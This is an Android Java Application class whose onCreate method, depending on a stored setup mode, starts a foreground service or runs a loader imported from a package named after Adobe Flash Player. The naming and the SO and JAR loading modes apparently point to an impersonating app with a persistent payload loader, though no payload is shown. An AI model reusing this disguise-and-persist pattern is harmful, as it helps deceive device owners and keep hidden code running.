package com.main;

import com.adobe.flashplayer.SoEntry;
import com.utils.PrefOper;
import android.app.Application;
import android.content.Context;
import android.util.Log;

//getApplication和getApplicationContext得到的是同一个对象，两者的区别仅仅是返回类型不同
//Context作为一个抽象的基类，它的实现子类有三种：Application、Activity和Service（估计这么说，暂时不管ContextWrapper等类）
public class SourceApplication  extends Application{

	private String TAG = "SourceApplication";
	
	public static Context mInstance;
	
	public static Context getInstance() {
		return mInstance;
	}
    @Override
    public void onCreate() {
        super.onCreate();
        mInstance = this;
        Log.e(TAG,"onCreate");
        
        String v = PrefOper.getValue(this, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SETUPCOMPLETE);
        if(v != null && v.equals("ok")){
			String value = PrefOper.getValue(this, ForegroundService.PARAMCONFIG_FileName,ForegroundService.SETUPMODE);
			if (value != null && (value.equals(ForegroundService.SETUPMODE_MANUAL) == true ||
					value.equals(ForegroundService.SETUPMODE_APK) == true)) {
				MainUtils.checkStartForegroundService(this);
			}else if(value.equals(ForegroundService.SETUPMODE_SO) || value.equals(ForegroundService.SETUPMODE_JAR)){
				new Thread(new SoEntry(this)).start();
			}
        }
    }
    
	@Override
	public void onTerminate(){
		super.onTerminate();
		Log.e(TAG, "onTerminate");
	}
    
}